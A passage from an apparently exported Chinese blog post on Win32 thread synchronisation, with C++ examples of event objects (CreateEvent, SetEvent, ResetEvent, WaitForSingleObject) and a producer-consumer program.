comment\">//hEvent = CreateEvent (NULL, TRUE, FALSE, NULL);// 使用手动重置为无信号状态，初始化时无信号状态</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>    <span class=\"token comment\">/*</pre></td></tr><tr><td data-num=\"38\"></td><td><pre>    执行结果，可想而知，只能输出：</pre></td></tr><tr><td data-num=\"39\"></td><td><pre>    in thread1@!</pre></td></tr><tr><td data-num=\"40\"></td><td><pre>    in thread2@!</pre></td></tr><tr><td data-num=\"41\"></td><td><pre>    因为初始为无信号状态，所以 hEvent 一直处于无信号状态，因此这两个线程一直在等待，直到主线程结束。</pre></td></tr><tr><td data-num=\"42\"></td><td><pre></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>    修改：放开例子中的注释部分：</pre></td></tr><tr><td data-num=\"44\"></td><td><pre></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>    if (SetEvent (hEvent))// 设置信号为有信号状态</pre></td></tr><tr><td data-num=\"46\"></td><td><pre>    &#123;</pre></td></tr><tr><td data-num=\"47\"></td><td><pre>    cout &lt;&lt; \"setEvent 成功\" &lt;&lt;endl;</pre></td></tr><tr><td data-num=\"48\"></td><td><pre>    &#125;</pre></td></tr><tr><td data-num=\"49\"></td><td><pre>    可见，线程 1 和线程 2 都执行了。</pre></td></tr><tr><td data-num=\"50\"></td><td><pre></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>    因为调用 SetEvent，事件变为有信号状态，线程 1 执行；又由于线程 1 释放后，hEvent 仍旧处于有信号状态，所以线程 2 也执行了。</pre></td></tr><tr><td data-num=\"52\"></td><td><pre></pre></td></tr><tr><td data-num=\"53\"></td><td><pre>    再修改：在线程 1 中，添加 ResetEvent (hEvent)（手动设置事件为无信号状态），则线程 2 不会执行。</pre></td></tr><tr><td data-num=\"54\"></td><td><pre>    */</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre></pre></td></tr><tr><td data-num=\"56\"></td><td><pre></pre></td></tr><tr><td data-num=\"57\"></td><td><pre>    <span class=\"token comment\">// 在第 1、3、4 种情况下注释 SetEvent 函数</span></pre></td></tr><tr><td data-num=\"58\"></td><td><pre>    <span class=\"token comment\">//if (SetEvent(hEvent))  </span></pre></td></tr><tr><td data-num=\"59\"></td><td><pre>    <span class=\"token comment\">//&#123;  </span></pre></td></tr><tr><td data-num=\"60\"></td><td><pre>    <span class=\"token comment\">//  cout &lt;&lt; \"setEvent 成功\" &lt;&lt;endl;  </span></pre></td></tr><tr><td data-num=\"61\"></td><td><pre>    <span class=\"token comment\">//&#125;</span></pre></td></tr><tr><td data-num=\"62\"></td><td><pre></pre></td></tr><tr><td data-num=\"63\"></td><td><pre></pre></td></tr><tr><td data-num=\"64\"></td><td><pre>    <span class=\"token comment\">// 创建线程</span></pre></td></tr><tr><td data-num=\"65\"></td><td><pre>    hThread1 <span class=\"token operator\">=</span> <span class=\"token function\">CreateThread</span><span class=\"token punctuation\">(</span><span class=\"token constant\">NULL</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span>LPTHREAD_START_ROUTINE<span class=\"token punctuation\">)</span>ThreadProc1<span class=\"token punctuation\">,</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"66\"></td><td><pre>    <span class=\"token function\">Sleep</span><span class=\"token punctuation\">(</span><span class=\"token number\">200</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"67\"></td><td><pre>    hThread2 <span class=\"token operator\">=</span> <span class=\"token function\">CreateThread</span><span class=\"token punctuation\">(</span><span class=\"token constant\">NULL</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span>LPTHREAD_START_ROUTINE<span class=\"token punctuation\">)</span>ThreadProc2<span class=\"token punctuation\">,</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"68\"></td><td><pre>    <span class=\"token function\">Sleep</span><span class=\"token punctuation\">(</span><span class=\"token number\">200</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"69\"></td><td><pre></pre></td></tr><tr><td data-num=\"70\"></td><td><pre></pre></td></tr><tr><td data-num=\"71\"></td><td><pre></pre></td></tr><tr><td data-num=\"72\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token constant\">NULL</span> <span class=\"token operator\">==</span> hThread1<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"73\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"74\"></td><td><pre>        cout <span class=\"token operator\">&lt;&lt;</span> <span class=\"token string\">\"create thread fail!\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"75\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"76\"></td><td><pre></pre></td></tr><tr><td data-num=\"77\"></td><td><pre>    <span class=\"token comment\">//system(\"pause\");</span></pre></td></tr><tr><td data-num=\"78\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"79\"></td><td><pre>    <span class=\"token keyword\">return</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"80\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"81\"></td><td><pre></pre></td></tr><tr><td data-num=\"82\"></td><td><pre>DWORD WINAPI <span class=\"token function\">ThreadProc1</span><span class=\"token punctuation\">(</span>LPVOID lpParam<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"83\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"84\"></td><td><pre>    cout <span class=\"token operator\">&lt;&lt;</span> <span class=\"token string\">\"in thread1@!\"</span> <span class=\"token operator\">&lt;&lt;</span> endl<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"85\"></td><td><pre></pre></td></tr><tr><td data-num=\"86\"></td><td><pre>    DWORD dReturn <span class=\"token operator\">=</span> <span class=\"token function\">WaitForSingleObject</span><span class=\"token punctuation\">(</span>hEvent<span class=\"token punctuation\">,</span> INFINITE<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"87\"></td><td><pre></pre></td></tr><tr><td data-num=\"88\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>WAIT_OBJECT_0 <span class=\"token operator\">==</span> dReturn<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"89\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"90\"></td><td><pre>        cout <span class=\"token operator\">&lt;&lt;</span> <span class=\"token string\">\" thread1 signaled ! \"</span> <span class=\"token operator\">&lt;&lt;</span> endl<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"91\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"92\"></td><td><pre>    cout <span class=\"token operator\">&lt;&lt;</span> <span class=\"token string\">\"in thread1 --signal\"</span> <span class=\"token operator\">&lt;&lt;</span> endl<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"93\"></td><td><pre></pre></td></tr><tr><td data-num=\"94\"></td><td><pre>    <span class=\"token comment\">//SetEvent(hEvent); </span></pre></td></tr><tr><td data-num=\"95\"></td><td><pre>    <span class=\"token comment\">//ResetEvent(hEvent);</span></pre></td></tr><tr><td data-num=\"96\"></td><td><pre>    <span class=\"token keyword\">return</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"97\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"98\"></td><td><pre></pre></td></tr><tr><td data-num=\"99\"></td><td><pre>DWORD WINAPI <span class=\"token function\">ThreadProc2</span><span class=\"token punctuation\">(</span>LPVOID lpParam<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"100\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"101\"></td><td><pre>    cout <span class=\"token operator\">&lt;&lt;</span> <span class=\"token string\">\"in thread2@!\"</span> <span class=\"token operator\">&lt;&lt;</span> endl<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"102\"></td><td><pre></pre></td></tr><tr><td data-num=\"103\"></td><td><pre>    DWORD dReturn <span class=\"token operator\">=</span> <span class=\"token function\">WaitForSingleObject</span><span class=\"token punctuation\">(</span>hEvent<span class=\"token punctuation\">,</span> INFINITE<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"104\"></td><td><pre></pre></td></tr><tr><td data-num=\"105\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>WAIT_OBJECT_0 <span class=\"token operator\">==</span> dReturn<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"106\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"107\"></td><td><pre>        cout <span class=\"token operator\">&lt;&lt;</span> <span class=\"token string\">\"thread2 signaled ! \"</span> <span class=\"token operator\">&lt;&lt;</span> endl<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"108\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"109\"></td><td><pre>    cout <span class=\"token operator\">&lt;&lt;</span> <span class=\"token string\">\"in thread2--signal\"</span> <span class=\"token operator\">&lt;&lt;</span> endl<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"110\"></td><td><pre></pre></td></tr><tr><td data-num=\"111\"></td><td><pre>    <span class=\"token keyword\">return</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"112\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><h1 id=\"线程同步\"><a class=\"anchor\" href=\"#线程同步\">#</a> 线程同步</h1>\n<p>线程互斥：线程互斥是指对于共享的进程系统资源，在各单个线程访问时的排它性。当有若干个线程都要使用某一共享资源时， 任何时刻最多只允许一个线程去使用，其它要使用该资源的线程必须等待，直到占用资源者释放该资源。</p>\n<p>线程同步：线程同步是指线程之间所具有的一种制约关系，一个线程的执行依赖另一个线程的消息，当它没有得到另一个线程的消息时应等待，直到消息到达时才被唤醒。</p>\n<p>同步 = 互斥 + 有序执行</p>\n<p>同步的前提是互斥</p>\n<h2 id=\"生产者和消费者\"><a class=\"anchor\" href=\"#生产者和消费者\">#</a> 生产者和消费者</h2>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span><span class=\"token string\">&lt;stdio.h></span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span><span class=\"token string\">&lt;stdlib.h></span></span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span><span class=\"token string\">&lt;Windows.h></span></span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>HANDLE hproducer<span class=\"token punctuation\">,</span> hconsumer<span class=\"token punctuation\">;</span><span class=\"token comment\">// 生产者消费者句柄</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">int</span> G_Max <span class=\"token operator\">=</span> <span class=\"token number\">10</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">int</span> G_Product <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>DWORD WINAPI <span class=\"token function\">Thread1</span><span class=\"token punctuation\">(</span>LPVOID lpParam<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>DWORD WINAPI <span class=\"token function\">Thread2</span><span class=\"token punctuation\">(</span>LPVOID lpParam<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token keyword\">int</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>\tHANDLE hThread<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>\thproducer <span class=\"token operator\">=</span> <span class=\"token operator\">::</span><span class=\"token function\">CreateEvent</span><span class=\"token punctuation\">(</span><span class=\"token constant\">NULL</span><span class=\"token punctuation\">,</span> FALSE<span class=\"token punctuation\">,</span> TRUE<span class=\"token punctuation\">,</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>\thconsumer <span class=\"token operator\">=</span> <span class=\"token operator\">::</span><span class=\"token function\">CreateEvent</span><span class=\"token punctuation\">(</span><span class=\"token constant\">NULL</span><span class=\"token punctuation\">,</span> FALSE<span class=\"token punctuation\">,</span> FALSE<span class=\"token punctuation\">,</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>\thThread<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token operator\">::</span><span class=\"token function\">CreateThread</span><span class=\"token punctuation\">(</span><span class=\"token constant\">NULL</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> Thread1<span class=\"token punctuation\">,</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>\thThread<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token operator\">::</span><span class=\"token function\">CreateThread</span><span class=\"token punctuation\">(</span><span class=\"token constant\">NULL</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> Thread2<span class=\"token punctuation\">,</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>\t<span class=\"token function\">WaitForMultipleObjects</span><span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span> hThread<span class=\"token punctuation\">,</span> TRUE<span class=\"token punctuation\">,</span> INFINITE<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>\t<span class=\"token function\">CloseHandle</span><span class=\"token punctuation\">(</span>hThread<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>\t<span class=\"token function\">CloseHandle</span><span class=\"token punctuation\">(</span>hThread<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>\t<span class=\"token function\">CloseHandle</span><span class=\"token punctuation\">(</span>hproducer<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>\t<span class=\"token function\">CloseHandle</span><span class=\"token punctuation\">(</span>hconsumer<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>\t<span class=\"token keyword\">return</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre></pre></td></tr><tr><td data-num=\"32\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>DWORD WINAPI <span class=\"token function\">Thread1</span><span class=\"token punctuation\">(</span>LPVOID lpParam<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>\t<span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> G_Max<span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>\t<span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>\t\t<span class=\"token function\">WaitForSingleObject</span><span class=\"token punctuation\">(</span>hproducer<span class=\"token punctuation\">,</span> <span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">// 一直在等待信号</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>\t\t<span class=\"token operator\">++</span>G_Product<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>\t\tDWORD id <span class=\"token operator\">=</span> <span class=\"token operator\">::</span><span class=\"token function\">GetCurrentThreadId</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>\t\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"生产者%d生产一个！产品数量为%d\\n\"</span><span class=\"token punctuation\">,</span> id<span class=\"token punctuation\">,</span> G_Product<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>\t\t<span class=\"token function\">SetEvent</span><span class=\"token punctuation\">(</span>hconsumer<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>\t<span class=\"token keyword\">return</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>DWORD WINAPI <span class=\"token function\">Thread2</span><span class=\"token punctuation\">(</span>LPVOID lpParam<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>\t<span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> G_Max<span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>\t<span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>\t\t<span class=\"token function\">WaitForSingleObject</span><span class=\"token punctuation\">(</span>hconsumer<span class=\"token punctuation\">,</span> <span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>\t\t<span class=\"token operator\">--</span>G_Product<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre>\t\tDWORD id <span class=\"token operator\">=</span> <span class=\"token operator\">::</span><span class=\"token function\">GetCurrentThreadId</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre></pre></td></tr><tr><td data-num=\"54\"></td><td><pre>\t\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"消费者%d消费一个!产品剩余数量为%d\\n\"</span><span class=\"token punctuation\">,</span> id<span class=\"token punctuation\">,</span> G_Product<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre>\t\t<span class=\"token function\">SetEvent</span><span class=\"token punctuation\">(</span>hproducer<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"56\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"57\"></td><td><pre>\t<span class=\"token keyword\">return</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"58\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><h1 id=\"reference\"><a class=\"anchor\" href=\"#reference\">#</a> Reference</h1>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3UwMTE2NDI3NzQvYXJ0aWNsZS9kZXRhaWxzLzUyNzg5OTY5\">https://blog.csdn.net/u011642774/article/details/52789969</span></p>\n",
            "tags": [
                "Win32",
                "Win事件",
                "线程同步"
            ]
        }
    ]
}